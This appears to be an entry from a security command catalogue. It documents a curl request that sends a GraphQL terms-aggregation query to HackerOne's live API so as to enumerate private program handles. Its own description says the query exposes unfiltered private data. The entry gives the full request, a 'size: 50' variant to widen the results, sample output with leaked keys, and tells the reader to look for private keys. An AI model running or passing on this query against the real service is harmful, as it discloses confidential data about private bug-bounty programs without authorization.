---
id: cmd-graphql-terms-agg
data: >-
  curl -X POST https://api.hackerone.com/graphql -H "Content-Type:
  application/json" -H "Authorization: Bearer YOUR_TOKEN" -d '{"query": "query {
  me { id } opportunities_search(query:{}, aggs:{results:{terms:
  {field:\"handle\"}}}) { aggs } }"}'
tags:
  - graphql
  - aggregation
  - curl
type: command
output: >-
  {"data": {"me": null, "opportunities_search": {"aggs": {"results":
  {"doc_count_error_upper_bound": 0, "sum_other_doc_count": 37, "buckets":
  [{"key": "private", "doc_count": 1}, {"key": "another-private", "doc_count":
  2}] } } } } }
executor: bash
platforms:
  - Web
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:25:53.559Z'
verified: false
validated: true
submitted: true
---
# graphql-terms-aggregation-on-handle

## Command

```bash
curl -X POST https://api.hackerone.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{"query": "query { me { id } opportunities_search(query:{}, aggs:{results:{terms: {field:\"handle\"}}}) { aggs } }"}'
```

## Description

This command sends a GraphQL query to HackerOne's API to perform terms aggregation on the 'handle' field in the opportunities_search endpoint, exposing unfiltered private data.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `-H "Content-Type: application/json"` | Sets JSON content type | Yes |
| `-H "Authorization: Bearer YOUR_TOKEN"` | Provides auth token (replace YOUR_TOKEN) | Yes for auth |
| `-d '{...}'` | JSON payload with the GraphQL query | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://api.hackerone.com/graphql -H "Content-Type: application/json" -d '{"query": "query { me { id } }"}'
```

### Advanced Usage

```bash
curl -X POST https://api.hackerone.com/graphql -H "Content-Type: application/json" -H "Authorization: Bearer TOKEN" -d '{"query": "query { opportunities_search(query:{}, aggs:{results:{terms: {field:\"handle\", size: 50}}}) { aggs } }"}'
```

Add 'size: 50' to limit or expand buckets.

## Expected Output

JSON response with aggregation buckets, e.g., {"data": {"opportunities_search": {"aggs": {"results": {"buckets": [{"key": "private", "doc_count": 1}]}}}}. Look for private keys indicating disclosure.

## Related

- [[Related Procedure: Execute Terms Aggregation Query on Handle Field]]
